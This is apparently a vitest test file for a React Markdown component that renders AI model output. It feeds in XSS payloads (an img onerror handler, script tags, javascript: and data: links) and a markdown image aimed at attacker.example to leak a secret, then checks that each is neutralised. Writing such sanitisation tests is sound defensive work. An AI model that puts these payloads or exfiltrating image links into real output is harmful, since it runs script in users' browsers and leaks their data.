import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { Markdown } from "./Markdown";

const rendered = (text: string) => render(<Markdown text={text} />).container;

describe("model output", () => {
  it("never becomes live HTML", () => {
    const box = rendered('<img src=x onerror="alert(1)"> <script>alert(2)</script>');
    expect(box.querySelector("img, script")).toBeNull();
  });

  it("never makes the browser fetch an image", () => {
    const box = rendered("![leak](https://attacker.example/?d=secret)");
    expect(box.querySelector("img")).toBeNull();
    expect(box.querySelector("a")?.textContent).toBe("leak");
  });

  it.each(["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"])("drops a %s link", (url) => {
    expect(rendered(`[click](${url})`).querySelector("a")?.getAttribute("href") ?? "").not.toMatch(/^(javascript|data):/);
  });

  it("opens links away from this page", () => {
    const link = rendered("[docs](https://example.com/a_(b))").querySelector("a");
    expect(link?.getAttribute("href")).toBe("https://example.com/a_(b)");
    expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
    expect(link?.getAttribute("target")).toBe("_blank");
  });

  it("keeps snake_case names and single newlines", () => {
    const box = rendered("use search_docs_now\nthen `query_employees`");
    expect(box.querySelector("em")).toBeNull();
    expect(box.querySelector("br")).not.toBeNull();
    expect(box.querySelector("code")?.textContent).toBe("query_employees");
  });
});
